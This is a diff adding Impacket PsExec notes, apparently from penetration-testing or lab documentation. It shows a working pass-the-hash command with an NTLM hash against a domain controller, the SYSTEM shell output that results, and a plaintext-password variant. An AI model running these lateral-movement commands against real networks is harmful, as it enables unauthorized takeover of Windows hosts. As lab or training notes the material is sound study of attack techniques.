@@ -38,3 +38,52 @@ C:\Windows\system32>whoami
 corp\jen
 ```
 
+
+
+## Impacket-Psexec
+
+We can use Impacket on our Kali host to connect via PsExec.
+
+### Pass The Hash
+
+```shell
+kali@kali:~$ proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 172.16.6.240.....
+[*] Found writable share ADMIN$
+[*] Uploading file CGOrpfCz.exe
+[*] Opening SVCManager on 172.16.6.240.....
+[*] Creating service tahE on 172.16.6.240.....
+[*] Starting service tahE.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.1006]
+(c) Microsoft Corporation. All rights reserved.
+
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> hostname
+DCSRV1
+
+C:\Windows\system32> ipconfig
+ 
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 172.16.6.240
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.6.254
+```
+
+
+
+### Plaintext Password
+
+```shell-session
+kali@kali:~$ proxychains -q impacket-psexec beccy@172.16.6.240
+```
